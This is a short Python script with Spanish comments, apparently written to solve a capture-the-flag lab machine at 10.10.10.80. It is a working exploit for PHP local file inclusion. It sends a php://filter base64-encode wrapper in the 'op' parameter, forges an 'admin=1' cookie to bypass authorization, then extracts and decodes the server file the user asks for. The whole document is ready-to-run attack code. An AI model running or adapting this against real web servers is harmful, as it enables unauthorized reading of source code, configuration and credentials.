#!/usr/bin/python3

import requests, urllib.parse
import signal, argparse
import base64
from pwn import *

# -- Variables globales
URL = "http://10.10.10.80"

# -- Funciones
# CTRL+C
def def_handler(sig, frame):
    print("\ns4lí...\n")
    exit(0)

# Parametros que recibimos
def arguments():
    parse = argparse.ArgumentParser()
    parse.add_argument(dest="filename", type=str, help="Recurso que quieres ver.")
    return parse.parse_args()

signal.signal(signal.SIGINT, def_handler)

# -- Inicio del programa
args = arguments()

data_get = {
    "op": "php://filter/convert.base64-encode/resource=" + args.filename
}
r = requests.get(URL, params=data_get, cookies={"admin":"1"})

# Generamos un array de X elementos con la respuesta
text_to_find_b64 = r.text.split()
# Sabemos que el b64 esta despues de la etiqueta </nav>, entonces buscamos esa etiqueta en el array y tomamos el contenido de la siguiente posición
pos_b64_in_text = [pos_array + 1 for pos_array in range(len(text_to_find_b64)) if "</nav>" in text_to_find_b64[pos_array]][0]

if len(text_to_find_b64[pos_b64_in_text]) > 100:
    file_content_b64 = text_to_find_b64[pos_b64_in_text]
    
    file_content = base64.b64decode(bytes(file_content_b64, 'ascii')).decode('utf-8')
    print("\n" + file_content)